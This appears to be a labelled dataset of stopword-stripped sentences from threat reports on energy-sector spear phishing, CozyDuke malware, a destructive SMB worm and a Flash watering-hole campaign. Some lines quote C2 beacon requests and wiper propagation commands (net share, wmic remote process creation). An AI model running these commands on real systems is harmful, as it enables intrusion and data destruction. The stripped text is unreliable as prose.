Seventy emails sent 58 individuals using either '' 2012-13 NFL Playoffs Schedule '' '' Re 2012-13 NFL Playoffs Schedule '' subject line	0
In wave attackers used similar AVP.dll one used	0
In emails additional CHM file old exploit used effort maximize chances successful infection	0
After second wave attack ceased	0
It unknown attackers successfully retrieved information seeking installed back door Trojans gained passwords allowed directly access computers given target	1
A global oil company offices around world continuous attack time September 2012 noticed upsurge activity 34 times suspicious emails average	0
This provided clear indication something suspicious going	0
At end wave emails hotel chain rental car company two financial institutions also targeted attacker	0
This may attempt find information could used future social engineering attack oil company	0
In total 136 email accounts oil company targeted	0
A regional sales manager Greece received 412 emails 12 month period 155 different attachments	0
A HR person country received second largest amount emails 90 total	0
Seventeen people targeted 70 90 times many region	0
The rest targeted people received less five emails seems undirected spraying hope least would fall bait	0
Clearly one person received highest volume emails deemed high value attackers	0
Possible explanations attack could competitor wanted know upcoming deal details oil field exploration would highly speculative	0
The spear phishing emails came 234 spoofed addresses	1
They made appear linked company relation subject attachment chosen	1
Many emails came country main targeted sales manager	0
The emails contained malicious attachments	1
None linked third party sites drive-by downloads	0
Of attachments 1,588 .exe	0
extension	0
Of 842 .pdf.exe	0
extension	0
The malware chosen variant Poison Ivy Trojan Backdoor.Darkmoon minor cases Trojan droppers would download additional malware	1
The attackers use zero-day exploits drop payload	0
The social engineering messages concentrated mainly around following two themes Once installed back door would create registry run key order restart Windows connect one three C & C servers located Greece	1
The last C & C server used since 2010 similar attacks companies	1
Other sub-domains free host DNS service used groups spread malware past	0
The chosen names C & C server domains imitates legitimate services bid overlooked system administrators checking logs	1
The back door provides full remote access compromised computers allowing extraction data	1
It unknown attackers succeeded goal valuable information extracted	0
The attacks completely disappear email volume decreased significantly emails per week afterwards	0
As targeted attacks many different groups attackers operating field	0
These attacks attributed one group geographical region	0
We seen individuals competitors hacktivist groups possible state sponsored agents carrying attacks energy companies	0
Some attacks purely opportunistic seeking valuable information available	0
Other campaigns look like planned lengthy period carried methodically clear goal mind	0
The attackers tend go valuable information including maps new gas fields research efficient photovoltaic generators	0
This information great value competitors nations want make progress field	0
Another motivation attackers profit information stolen blackmailing company	0
The information used carry sabotage attacks designed disrupt ICSs energy sector also primary target sabotage attacks generate direct profit attacker	0
A competitor might interested generating bad press bad customer experience rival company order win new clients	0
For example January 2013 group claiming related Anonymous posted access details said Israeli SCADA systems power plants systems	0
Meanwhile '' Operation Save Arctic '' targeted multiple oil companies around globe protest drilling plans Arctic	0
Disgruntled employees also source attacks underestimated	0
With knowhow internal critical processes systems often know inflict serious damage	0
They may able perform system modifications could go unnoticed long periods	0
For regular client computers well-established best practice guidelines apply	0
These computers often first ones attacked	0
Once compromised attacker use computers try explore deeper internal networks	0
Securing hardening deployed operating systems working strategy patch deployment important	0
Reoccurring security awareness training help users identify social engineering attempts prevent falling victim first place	0
The company perform penetration testing Web network applications also ICSs identify remedy vulnerability	0
For examples Web applications tested SQL injection attacks	0
This also help confirm applied polices followed patch level correct computers systems compliant	0
Companies monitor Internet information attacks vertical apply lessons learned possible	0
In addition different layers security products help achieve better overall protection	0
• Security Information Event Manager system ( SIEM ) Using SIEM help correlate related alerts one place	0
This centralized view cross referenced threat intelligence data generate prioritization action plan	0
Painting bigger picture overall security state reveal previously unnoticed attacks	0
For example failed login attempts internal servers could indicate password breach	0
This includes logging critical systems synchronization time among multiple systems	0
• Ingress egress filtering Filtering network traffic firewalls content filters IPS allows control data flows	0
This prevent attackers reaching internal systems	0
It important also monitor outbound traffic data exfiltration key point cyberespionage	0
It noted increased use cloud services mobile devices traffic might never pass company 's gateways	0
Where traffic blocking disruptive least monitoring implemented	0
• Data loss prevention ( DLP ) DLP solutions track access flow critical information prevent leaving company encrypt automatically	0
• Endpoint protection Depending usage pattern computer different solutions available protect endpoint	0
Antivirus solution proactive detection methods like behavioral analysis reputation scanning prevent unknown malware installing	0
HIPS ( host based intrusion prevention systems ) behavioral lockdown whitelisting protect computers kind unwanted tampering without need constant updates	0
• System protection For non-standard IT systems hardening increase security	0
On industrial systems often updated updated exploitation prevented help lockdown solutions like Symantec Critical System Protection ( CSP )	0
Through policies trusted system applications allowed run	0
ICS regularly checked upgraded new firmware exists	0
Where possible HIPS behavioral lockdown tools used secure computers	0
• Email filtering Proper email filtering prevent many spear phishing attempts reaching users	0
They help minimize risk untrained user falling social engineering tricks	0
• Authentication Some ICS contain hardcoded passwords wherever possible changed	0
ICS frequently use weakly authenticated protocols allow impersonation attacks	0
Where possible authentication methods upgraded least closely monitored	0
Strong authentication PKI used applicable	0
Industrial control systems ( ICS ) specially protected monitored	0
The control system control network secured	0
Where possible ICS separate Intranet	0
Isolating networks alone often enough protect control network make difficult attackers succeed	0
For systems make sense plan quickly disconnect separate critical machines event detected cyberattack	0
Cyberespionage campaigns sabotage attacks becoming increasingly common countless threat actors attempting gain foothold best protected organizations	0
At stage roughly five targeted attacks per day mounted firms energy sector	0
These attacks become increasingly sophisticated although capabilities tactics used threat actors vary considerably	0
In second half 2012 energy sector second targeted 16 percent targeted attacks	0
This strong increase mainly due large scale attack one global oil company	0
In first half 2013 energy sector ranked fifth 7.6 percent attacks focused sector	0
In general observed attackers becoming efficient focusing smaller operations attract less attention	0
The attackers tend go valuable information – maps new gas field – sector also major target sabotage attacks generate direct profit attacker	0
Such disruptive attacks already happen may lead large financial losses	0
State sponsored agents competitors internal attackers hacktivists likely authors sabotage attacks	0
Fortunately many successful sabotage attacks energy companies date	0
However increasing number connected systems centralized control ICS systems means risk attacks future increase	0
Energy utility companies need aware risks plan accordingly protect valuable information well ICS SCADA networks	0
Social engineering essential part spear phishing campaigns	0
A cleverly chosen enticing message may prompt user opening attachment	0
It evident attackers carefully selecting themes use attacks	0
Some groups use real news stories copy text directly newspaper websites	0
Others try appeal personal hobbies order get user 's attention	0
In energy sector commonly used theme spear phishing emails money related ( e.g	0
'' Wage Data 2012 '' ) followed sports related themes ( e.g	0
'' 2012-13 NFL Playoffs Schedule '' )	0
As example subject line '' Wage Data 2012 '' used 944 emails sent 26 different email addresses targets nine different sectors	1
The attack carried eight days used infected Microsoft Word document every instance	1
In general topic used social engineering attempt makes even harder regular users spot attacks	0
Here examples subject lines used listed category In last six month 2012 average number targeted attacks observed per day 87 ( 14 energy sector )	0
In first six month 2013 average number decreased 60 targeted attacks per day ( five energy sector )	0
The spike August September 2012 mostly related large scale attack global oil company	0
The increase May 2013 due multiple attacks financial services public sector IT service organizations	0
The government public sector quantitatively attacked sector 25.4 percent targeted attacks falling sector last half 2012 24 percent first half 2013	0
The energy sector accounted 7.6 percent targeted attacks making fifth targeted sector first six month 2013	0
This big decrease 16.3 percent attacks last half 2012 second attacked sector	0
This spike 2012 mainly due large attack campaign global oil company took place September 2012	0
On average saw 18.6 mail accounts attacked given target company last half 2012 ( 60.7 energy sector ) 5.6 email accounts first half 2013 ( 10 energy sector )	0
Overall see trend attacker conducting focused attacks fewer individuals	0
This generates less noise risk getting noticed discovered smaller	0
These emails sent small bursts repeated changing target space till enough computers compromised	0
Half attachments analyzed used extension would run directly double clicked	0
This old method still common scheme used	0
Of attachments analyzed 38 percent .exe	0
12 percent .src	0
files	0
In total 6 percent used double extensions like .pdf.exe	0
fool user	0
It also noted 23 percent Microsoft Word documents using exploit execute custom code computer	0
There also exotic extensions used like AutoIt scripts ( .au3	0
) ZX-Edit files ( .zed	0
) exception rather rule	0
It might attackers tried bypass email filtering software experimenting different attachment types	0
Sometimes even older exploits like Microsoft DirectX DirectShow Length Record Remote Code Execution Vulnerability ( CVE- 2009-1539 ) .mp4	0
files still occasionally used	0
This indicates either attackers knowhow use newer exploits publicly available speculate target patched computers	0
Some attackers seem sophisticated	0
For example used '' www	0
[ COMPANY-NAME ] .com.exe	0
'' attachment name clearly missing '' .com	0
'' end would sufficient run additional '' .exe	0
'' needed	0
To identify series targeted attacks likely performed individuals used novel attack attribution methodology named TRIAGE	0
Developed Symantec Research Labs TRIAGE data mining software relies multi-criteria decision analysis intelligent data fusion algorithms reliably link different attacks source	0
This framework developed order automate cyberintelligence tasks reduce time needed get insights organized cybercrime activities	0
By enabling rapid analysis large security data sets Symantec analysts quickly efficiently attribute various waves cyberattacks specific attack campaign likely run individuals	0
The TRIAGE framework recently enhanced novel visualizations thanks VIS-SENSE European research project aiming developing visual analytics technologies network security applications	0
Since original conception TRIAGE successfully used analyze behavior cybercriminals involved various types Internet attack activities rogue antivirus websites spam botnets operations scam campaigns targeted attacks performed via spear phishing emails	0
As targeted attacks attacks energy sector often follow pattern	0
It broken different phases attack	0
It noted seen attackers modify behavior exceptions norm possible especially target company special circumstances security measures place	0
During phase attacker tries learn much possible targeted organization	0
Information sources often include social networks job posting sites press releases	0
This enables attacker learn contact details possible target individuals well context used social engineering scenarios	0
The attacker often create list implemented security software used targeted company whatever information available	0
These investigations often start completely passively without direct contact company since many data sources publicly available	0
Subsequently attacker use interaction needed	0
Some attackers go effort creating fake social media account befriending key employees	0
After period small talk create false sense security connection used pass infected document find key information	0
Depending targeted location physical reconnaissance eavesdropping may also used	0
The actual break-in occurs phase	0
The attacker usually compromises network delivering targeted malware vulnerable systems employees	1
There two main avenues attack	0
One send spear phishing emails link malicious website malicious attachment delivered using social engineering techniques	1
The second method gaining traction watering hole attacks attacker infects website high likelihood visited intended victim	1
By using IP address filters infecting visitor sites attacker reduce number infected systems bring manageable quantity assessed manually another time	1
Some groups carefully plan watering hole attacks	1
For example Hidden Lynx group stopped using zero-day vulnerability large watering hole attack Microsoft released details vulnerability	0
This helped cover activities avoid unwanted attention	0
A days later group resumed watering hole attack time using different exploit	1
For difficult targets man-in-the-middle attacks used	0
These performed either physical location posing genuine Wi-Fi hotspot supply chain attacks	1
This enable attacker swap update legitimate software maliciously crafted version	1
Once victim installs genuine looking update attacker effectively gains control computer	1
Due complexity attack rarely used	0
Depending skills attacker time available attacker might also attack systems perimeter Web servers try break	0
The malware used always sophisticated	0
Sometimes regular off-the-shelf back door Trojan used	1
In cases person behind malware orchestrating commands makes difference targeted attack broad generic infection	0
Having said unique targets often see use specifically designed piece malware case Stuxnet	0
Depending protection measures implemented target attackers may also digitally sign malware creation	0
In past quite cases code signing certificates stolen later misused sign malware order pass unnoticed high value targets	0
Once attacker foothold one system next step create plan lateral movement network interesting data found	0
With specialized teams attackers often observe infected system first analyzed ensure interest	1
With watering hole attacks especially happen computers targeted get infected	0
Infected computers need assessed attacker necessary removed keep profile chances exposure low	0
One obvious tasks performed attackers install key loggers dump local credentials search local storage saved accounts sniff network passwords	1
Any account detail useful	0
Domain administrator passwords especially high value help greatly moving Intranet	0
Often small scripts even manual commands used comb local files create network mappings	1
Simple system commands help attacker learn installed security tools saved links internal platforms local address books	1
Once new systems identified attacker attempt hop onto well	0
In instances might even use zero-day vulnerabilities spread network	1
One method gaining relevance hijacking local software distribution systems distribution	1
This either proprietary systems case Trojan.Jokra South Korea OS-specific hijacking Windows Update case Flamer	0
Once attackers successfully managed create distribute package easily infect connected systems	1
Especially cases wiping attacks Trojan.Jokra efficient way disrupt many computers possible	0
If target assumed separated network connected Internet malware used might try autonomously infect removable drives like USB sticks project files PLCs	1
This could allow malware manually introduced destination network without knowledge carrier essentially jumping air gaps isolated networks	1
At end discovery phase attackers know internals infected networks identified systems interesting data connected industrial control systems	1
The capture exfiltration phases always present	0
If sole goal attackers cause disruption may directly jump destructive payload	0
However cases information extracted first turn allows sabotage constructed efficiently later phase	0
In phase interesting data gathered sent back attackers	1
This done different levels sophistication	0
The simple attacks compress files upload FTP HTTP POST request remote drop server	1
More sophisticated attackers obfuscate data XOR-ing encrypting proper asymmetric encryption embedding media files using steganography hide data traffic inspection	1
In addition amount data sent timing chosen smart way	0
For example malware samples send data smaller bursts swamp network generate network spikes might attract attention	1
Since employees use laptops malware use location awareness detect compromised computer outside corporate network send data 's directly connected Internet Wi-Fi hotspot airport	1
This might allow traffic bypass perimeter security receive less scrutiny	1
In instances infected computer might direct connection Internet	0
In cases previously compromised computer DMZ act proxy forwarding collected data	1
This destructive payload launched	0
If attackers information phase might happen	0
The targets goals disruption attacks different thing one- size-fits-all disruption attacks	0
For example Stuxnet tailored attack specific uranium enrichment facility would work different target	0
In recent times wiper Trojans popular attacks energy sector	0
The malware deletes files computer deletes master boot record rendering computer unusable	1
This happen operating systems seen scripts different UNIX flavors used well	0
Depending disaster recovery plan place computers remotely recovered	0
However may still outage computers restored	0
Unit 42 uncovered new campaign CozyDuke threat actors aka CozyCar [ 1 ] leveraging malware appears related Seaduke malware described earlier week Symantec	0
[ 2 ] This campaign began July 7 2015 appears targeted government organizations think - tanks located democratic countries [ 3 ] utilizes compromised legitimate websites spear phishing command control activity	1
Unit 42 discovered extent attack using Palo Alto Networks AutoFocus service allows analysts quickly find correlations among malware samples analyzed WildFire	0
All files referenced throughout analysis contained IOC table end blog	0
The current CozyCar campaign includes spear phishing emails deliver payload either link .zip file compromised website direct delivery attachment phish	1
At time analysis phishing link longer active	0
When user opens attached file poorly detected executable file [ VT 1/54 ] extracted	0
The initial dropper self - extracting archive ( SFX )	0
Upon execution executable file drop two files % TEMP% directory decoy .wav file secondary dropper	0
The CozyDuke group commonly uses legitimate media files trick users	0
In reality media - .wav file female voice claiming reporter looking commentary - played secondary dropper executes background	0
The secondary dropper requests .swf file using SSL illustrated HTTP traffic	0
As writing domain extranet.qualityplanning[.]com resolved 64.244.34[.]200	0
GET /webscriptsecurity / view/4/player.swf HTTP/1.1 Accept text / html application / xhtml+xml,*/ * Accept - Language en_US User - Agent Mozilla/5.0 ( compatible ; MSIE 8.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET CLR 1.1.4322 ; .NET CLR 2.0.50727 ) Host extranet.qualityplanning[.]com Connection Keep - Alive GET /webscriptsecurity / view/4/player.swf HTTP/1.1 Accept text / html application / xhtml+xml,*/ * Accept - Language en_US User - Agent Mozilla/5.0 ( compatible ; MSIE 8.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET CLR 1.1.4322 ; .NET CLR 2.0.50727 ) Host extranet.qualityplanning[.]com Connection Keep - Alive The secondary dropper cleans simple vbs script ( md5:0d132ee171768dc30d14590ed2dbadd1 ) leaves decoy multimedia file behind	1
But dropper .swf file ? While player.swf file downloaded second stage dropper contain media decoy	0
The actual flash component file roughly 16 kb leaving approximately 200 kb file unaccounted	0
The second stage dropper contains decoding routines decode arbitrary binary data executable file	0
The executable file dropped % appdata%/Roaming appears try emulate legitimate software names TimbuktuDaemon SearchIndexer RtkAudioService64 dirmngr o2flash usbrefs64	0
This file observed VirusTotal July 9 extremely low detection rates [ VT 3/54 ]	0
It appears authors particular iteration CozyCar group 's malware internally call " miniDionis " according pdb strings left binary ( c:\BastionSolution\Shells\Projects\miniDionis4\miniDionis\obj\Release\miniDionis.pdb )	0
It also appears iteration " forkmeimfamous " aka Seaduke malware analyzed Unit 42 previous blog [ 4 ]	0
The malware stores 2 files % temp% directory configuration file secondary dll	0
The configuration file 's name matches final characters bot_id contained within per sample	0
Analysis secondary dll file ( name matches [ A - Z0 - 9]{1}\.tmp ) indicates primary function serve cleanup mechanism dropped binary	1
This likely attempt thwart forensic investigations	0
Further examination memory dumps taken following execution miniDionis reveals clues beaconing activity exhibited	0
The malware stores configuration values memory key value pairs	0
The configuration miniDionis JSON blob several important sections described table	0
The functional payload Trojan starts creating Mutex splitting " bot_id " value configuration hyphen ( " - " ) using second portion split string ( specifically " 01MRLXW " case configuration )	0
From functionality standpoint Trojan uses concept tasks processed completed using pool threads	0
To obtain tasks Trojan issue HTTPS request C2 server ( " host_scripts " configuration ) resembles following example beacon	1
GET /mobile / viewer.php HTTP/1.1 Accept * / * Accept - Language en - US User - Agent Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko Host www.illuminatistudios[.]net Cookie SSID = sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8 - 25A Accept - Encoding gzip deflate Connection Keep - Alive GET /mobile / viewer.php HTTP/1.1 Accept * / * Accept - Language en - US User - Agent Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko Host www.illuminatistudios[.]net Cookie SSID = sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8 - 25A Accept - Encoding gzip deflate Connection Keep - Alive The Trojan manually creates cookie HTTP request	0
The cookie contains ciphertext Trojan creates based " bot_id " JSON configuration	0
The Trojan compresses " bot_id " string using zlib encrypts using RC4 algorithm using generated key	0
The generated key SHA1 hash two randomly created strings first 2 8 bytes long second 1 7 characters length	0
The ciphertext " bot_id " based64 encoded finally appended " cookie_name " ( " SSID= " ) configuration sent within HTTP request C2 server	0
Unit 42 observe first random string ( 2 8 characters length ) sent C2 first beacon would required C2 reproduce exact SHA1 hash used key generate ciphertext cookie	0
Upon examination believe C2 able decrypt cookie first beacon	0
Instead C2 respond first beacon data Trojan use extract string using function named TrExtractKey seen Figure 2 replace first random string used generate SHA1 hash	0
Once C2 Trojan synchronized using string C2 able decrypt subsequent network beacons Trojan includes random string 1 7 characters makes second half SHA1 hash within cookie field ciphertext	0
The C2 communications several commands discuss blog include rather interesting technique manually handle HTTP redirection HTTP 301 Moved Permanently HTTP 302 Found status codes	0
The technique used handle redirections involves checking presence " Location " field within HTTP headers server response using regular expressions parse HTML within server response find appropriate URL	0
The code contains three regular expressions parse HTML locate URL first " a.*?>.*?</a " locates tags associated link within HTML	0
The second regular expression " onclick=\"Accept();\ " " locates links within HTML specific " onclick " action	0
The last regular expression " href\\s*=\\s*(?:[\"'](?<1>[^\"']*)[\"']|(?<1>\\S+ ) ) " obtain correct URL interact C2 server	0
Once C2 Trojan synchronized decrypt network communications C2 server begin responding beacons Trojan JSON blobs	1
Unit 42 received JSON blobs active C2 server based static analysis Trojan determined JSON would look follows	0
{ ' tasks ' [ { ' task_id ' " " ' task_data ' { ' command ' " " ' data ' " " } } ] } { ' tasks ' [ { ' task_id ' " " ' task_data ' { ' command ' " " ' data ' " " } } ] } The Trojan takes JSON blob adds task list pool processing	0
Separate worker threads access pool tasks process commands perform necessary activities	0
Unit 42 analyzed Trojan 's command handler found several commands seen Table 2 allows threat actors carry full range activities system	1
The actors behind CozyDuke framework highly sophisticated motivated become increasingly bold campaigns	0
We recommend security practitioners review included Indicators Compromise ( IoCs ) ensure targets campaign add appropriate security controls prevent future attacks	0
This group reliant social engineering thus user education remains paramount importance	0
Palo Alto Networks customers using WildFire protected campaign	0
All known elements campaign accurately identified WildFire malicious	0
IOCs Sources [ 1 ] https://securelist.com/blog/research/69731/the-cozyduke-apt/ [ 2 ] http://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory [ 3 ] http://www.theregister.co.uk/2015/04/22/cozyduke_hackers_white_house_state_dept_malware/ [ 4 ] http://researchcenter.paloaltonetworks.com/2015/07/unit-42-technical-analysis-seaduke/	0
Original release date December 19 2014 Microsoft Windows US-CERT recently notified trusted third party cyber threat actors using Server Message Block ( SMB ) Worm Tool conduct cyber exploitation activities recently targeting major entertainment company	0
This SMB Worm Tool equipped Listening Implant Lightweight Backdoor Proxy Tool Destructive Hard Drive Tool Destructive Target Cleaning Tool	1
SMB Worm Tool This worm uses brute force authentication attack propagate via Windows SMB shares	1
It connects home every five minutes send log data back command control ( C2 ) infrastructure successfully spread Windows hosts via SMB port 445	1
The tool also accepts new scan tasking connects C2	1
There two main threads first thread calls home sends back logs ( list successful SMB exploitations ) second thread attempts guess passwords SMB connections	1
If password correctly guessed file share established file copied run newly-infected host	1
Listening Implant During installation tool portion binaries decrypted using AES key derived phrase '' National Football League	0
'' Additionally implant listens connections TCP port 195 ( '' sensvc.exe '' '' msensvc.exe '' ) TCP port 444 ( '' netcfg.dll '' )	1
Each message sent implant preceded length XOR encoded byte 0x1F	1
Upon initial connection victim sends string '' HTTP/1.1 GET /dns ? \x00 '' The controller responds string '' 200 www.yahoo.com \x00 '' ( '' sensvc.exe '' '' msensvc.exe '' ) string '' RESPONSE 200 OK '' ( '' netcfg.dll '' )	1
The controller sends byte '' '' ( 0x21 ) end network connection	1
This special message preceded length XOR encoded	0
Lightweight Backdoor This backdoor listener designed service DLL	1
It includes functionality file transfer system survey process manipulation file time matching proxy capability	1
The listener also perform arbitrary code execution execute commands command line	1
This tool includes functionality open ports victim host 's firewall take advantage universal Plug Play ( UPNP ) mechanisms discover routers gateway devices add port mappings allowing inbound connections victim hosts Network Address Translated ( NAT ) private networks	1
There callback domains associated malware since connections inbound specified port number	0
Proxy Tool Implants malware family typically loaded via dropper installed service configured listen TCP port 443	1
The implant may associated configuration file contain configurable port	0
This proxy tool basic backdoor functionality including ability fingerprint victim machine run remote commands perform directory listings perform process listings transfer files	1
Destructive Hard Drive Tool This tool tailored hard-drive wiping tool intended destroy data past point recovery complicate victim machine 's recovery	1
If CNE operator administrator-level privileges host program over-write portions up-to first four physical drives attached over-write master boot record ( MBR ) program designed cause damage hard drive re-booted	1
This results victim machine non-operational irrecoverable data	1
( There caveat machines installed windows 7 operating system windows 7 machines continue operate degraded state targeted files destroyed reboot infected MBR wipes drive	1
) If actor user-level access result includes specific files deleted practically irrecoverable victim machine would remain usable	1
Destructive Target Cleaning Tool This tool renders victim machines inoperable overwriting Master Boot Record	1
The tool dropped installed another executable consists three parts executable dll contain destructive components encoded command file contains actual destruction commands executed	1
Network Propagation Wiper The malware ability propagate throughout target network via built-in Windows shares	1
Based username/password provided configuration file hostname/IP address target systems malware access remote network shares order upload copy wiper begin wiping process remote systems	1
The malware uses several methods access shares remote systems begin wiping files	1
Checking existing shares via '' \\hostname\admin $ \system32 '' '' \\hostname\shared $ \system32 '' create new share '' cmd.exe /q /c net share shared $ = % SystemRoot % /GRANT everyone FULL ''	1
Once successful malware uploads copy wiper file '' taskhostXX.exe '' changes file-time match built-in file '' calc.exe '' starts remote process	1
The remote process started via command '' cmd.exe /c wmic.exe /node hostname /user username /password pass PROCESS CALL CREATE ''	1
Hostname username password obtained configuration file	0
Afterwards remote network share removed via '' cmd.exe /q /c net share shared $ /delete ''	1
Once wiper uploaded malware reports status back one four C2 IP addresses	1
Technical strategic mitigation recommendations included Solution section	0
US-CERT recommends reviewing Security Tip Handling Destructive Malware # ST13-003	0
Cyber threat actors using SMB worm conduct cyber exploitation activities	0
This tool contains five components – listening implant lightweight backdoor proxy tool destructive hard drive tool destructive target cleaning tool	1
The SMB worm propagates throughout infected network via brute-force authentication attacks connects C2 infrastructure	1
Due highly destructive functionality malware organization infected could experience operational impacts including loss intellectual property disruption critical systems	0
Users administrators recommended take following preventive measures protect computer networks Use maintain anti-virus software – Anti-virus software recognizes protects computer known viruses	0
It important keep anti-virus software up-to-date ( see Understanding Anti-Virus Software information )	0
Keep operating system application software up-to-date – Install software patches attackers ca n't take advantage known problems vulnerabilities	0
Many operating systems offer automatic updates	0
If option available enable ( see Understanding Patches information )	0
Review Security Tip Handling Destructive Malware # ST13-003 evaluate capabilities encompassing planning preparation detection response event	0
Review Recommended Practices Control Systems Improving Industrial Control Systems Cybersecurity Defense-in-Depth Strategies ( pdf )	0
The following list Indicators Compromise ( IOCs ) added network security solutions determine whether present network	0
The malware following characteristics While original filename file unknown likely '' diskpartmg16.exe ''	0
This file serves dropper	1
It drops destructive malware '' igfxtrayex.exe ''	1
When dropper file executed started second instance '' -i '' argument terminated	1
The second instance dropper file installed '' WinsSchMgmt '' service '' -k '' command line argument started service terminated	1
The '' WinsSchMgmt '' service executed file '' -k '' argument started another instance file using '' -s '' argument	1
The '' -s '' instance dropped executed '' igfxtrayex.exe '' created '' netver.dat '' began generating network traffic TCP ports 445 139 victim IP addresses	1
This log file created dropper appended scans progress	1
It contains appear hostnames IP addresses number 2	0
Entries file structure '' HOSTNAME | IP Address | 2 ''	0
This file destructive malware disk wiper network beacon capabilities	1
If '' igfxtrayex.exe '' run parameters creates starts copy '' –i '' argument	1
After 10 minutes '' igfxtrayex.exe '' makes three copies places directory executed	1
These copies named according format '' taskhostXX.exe '' ( X randomly generated ASCII character )	0
These copies executed different argument ( one '' -m '' one '' -d '' '' -w '' )	1
Network connection attempts made one three hard-coded IP addresses random order port 8080 8000	1
If connection IP address made attempts connect another three IP addresses connections three IP addresses attempted	1
The following command-line string executed '' cmd.exe /c net stop MSExchangeIS /y ''	0
A 120-minute ( 2 hour ) sleep command issued computer shut rebooted	1
This file executed starts listener localhost port 80	1
It 3 files contained resource section ; xor 'd 0x63	1
This SYS file commercially available tool allows read/write access files raw disk sectors user mode applications Windows 2000 XP 2003 Vista 2008 ( 32-bit )	0
It dropped resource ID 0x81 '' igfxtrayex.exe ''	1
This SYS file also commercially available tool allows read/write access files raw disk sectors user mode applications Windows 2000 XP 2003 Vista 2008 ( 64-bit )	0
It dropped resource ID 0x83 '' igfxtrayex.exe ''	1
A summary C2 IP addresses Snort signatures Listening Implant Lightweight Backdoor Proxy Tool Malware associated cyber threat actor Below potential YARA signatures detect malware binaries host machines Because highly destructive functionality malware organization infected malware could experience operational impacts including loss intellectual property ( IP ) disruption critical systems	0
Actual impact organizations may vary depending type number systems impacted	0
Implement indicators compromise within systems detection mitigation purposes	0
Encourage users transfer critical files network shares allow central backed	0
Execute daily backups critical systems	0
Periodically execute '' offline '' backup critical files removable media	0
Establish emergency communications plans network resources become unavailable	0
Isolate critical networks ( including operations networks ) business systems	0
Identify critical systems evaluate need on-hand spares quickly restore service	0
Ensure antivirus date	0
Disable credential caching desktop devices particular importance critical systems servers restrict number cached credential portable devices three possible	0
This accomplished Group Policy Object ( GPO )	0
Disable AutoRun Autoplay removable media device	0
Prevent limit use removable media devices systems limit spread introduction malicious software possible exfiltration data except valid business case use	0
This business case must approved organization Chief IT Security Officer policy/guidance media used	0
Consider restricting account privileges	0
It recommendation daily operations executed using standard user accounts unless administrative privileges required specific function	0
Configure standard user accounts prevent execution installation unknown unauthorized software	0
Both standard administrative accounts access services required nominal daily duties enforcing concept separation duties	0
Lastly disable Web email capabilities administrative accounts	0
Compromise admin accounts one vector allows malicious activity become truly persistent network environment	0
Ensure password policy rules enforced Admin password values changed periodically	0
Consider prohibiting hosts within production environment DMZ sharing Active Directory enterprise hosts networks	0
Each environment separate forests within Active Directory trust relationships allowed forests possible	0
If necessary trust relationships one-way low integrity environment trusting higher integrity environment	0
Consider deployment coaching page click acceptance ; traditionally deployed environment log acceptance network acceptable use policy notify users monitoring	0
Coaching pages also provide measure protection automated malicious activity	0
This occurs automated malware normally incapable physically clicking acceptance radial button	0
Automated malware traditionally hardcoded execute retrieve commands additional executables Internet	0
If malware unable initiate active connection full train infection potentially halted	0
The danger still exists physical user authorize access use coaching pages infections limited least rate infection reduced	0
Monitor logs -- Maintain actively monitor centralized logging solution keeps track anomalous potentially malicious activity	0
Ensure network operating systems web browsers related network hardware software remain updated current patches fixes	0
Organizations review Security Tip Handling Destructive Malware # ST13-003 evaluate capabilities encompassing planning preparation detection response event	0
Always keep patch levels date especially computers host public services accessible firewall HTTP FTP mail DNS services	0
Build host systems especially critical systems servers essential applications components required perform intended function	0
Any unused applications functions removed disabled possible limit attack surface host	0
Implement network segmentation V-LANs limit spread malware	0
Consider deployment Software Restriction Policy set allow execution approved software ( application whitelisting )	0
Recommend whitelisting legitimate executable directories prevent execution potentially malicious binaries	0
Consider use two-factor authentication methods accessing privileged root level accounts systems	0
Consider deploying two-factor authentication hardened IPsec/VPN gateway split-tunneling prohibited secure remote access	0
Deny direct Internet access except use proxies Enterprise servers workstations	0
Perform regular content filtering proxies external firewall points presence	0
Also consider deployment explicit versus transparent proxy policy	0
Implement Secure Socket Layer ( SSL ) inspection capability inspect ingress egress encrypted network traffic potential malicious activity	0
Isolate network services email Web application servers utilizing secure multi-tenant virtualization technology	0
This limit damage sustained compromise attack single network component	0
Implement best practice guidance policy restrict use non-Foundation assets processing accessing Foundation-controlled data systems ( e.g. working home using personal device office )	0
It difficult enforce corporate policies detect intrusions conduct forensic analysis remediate compromises non-corporate owned devices	0
Minimize network exposure control system devices	0
Control system devices directly face Internet	0
Place control system networks behind firewalls isolate air gap business network	0
When remote access required use secure methods Virtual Private Networks ( VPNs ) recognizing VPN secure connected devices	0
Industrial Control System ( ICS ) -CERT US-CERT remind organizations perform proper impact analysis risk assessment prior taking defensive measures	0
Less week uncovering Operation SnowMan FireEye Dynamic Threat Intelligence cloud identified another targeted attack campaign - one exploiting zero-day vulnerability Flash	0
We collaborating Adobe security issue	0
Adobe assigned CVE identifier CVE-2014- 0502 vulnerability released security bulletin	0
As blog post visitors least three nonprofit institutions - two focus matters national security public policy - redirected exploit server hosting zero-day exploit	1
We 're dubbing attack '' Operation GreedyWonk	0
'' We believe GreedyWonk may related May 2012 campaign outlined ShadowServer based consistencies tradecraft ( particularly websites chosen strategic Web compromise ) attack infrastructure malware configuration properties	0
The group behind campaign appears sufficient resources ( access zero-day exploits ) determination infect visitors foreign public policy websites	1
The threat actors likely sought infect users sites follow-on data theft including information related defense public policy matters	1
On Feb. 13 FireEye identified zero-day Adobe Flash exploit affects latest version Flash Player ( 12.0.0.4 11.7.700.261 )	0
Visitors Peter G. Peterson Institute International Economics ( www.piie [ ] com ) redirected exploit server hosting Flash zero-day hidden iframe	1
We subsequently found American Research Center Egypt ( www.arce [ ] org ) Smith Richardson Foundation ( www.srf [ ] org ) also redirected visitors exploit server	1
All three organizations nonprofit institutions ; Peterson Institute Smith Richardson Foundation engage national security public policy issues	0
To bypass Windows ' Address Space Layout Randomization ( ASLR ) protections exploit targets computers following configurations Users mitigate threat upgrading Windows XP updating Java Office	1
If Java 1.6 update Java latest 1.7 version	0
If using out-of-date Microsoft Office 2007 2010 update Microsoft Office latest version	0
These mitigations patch underlying vulnerability	0
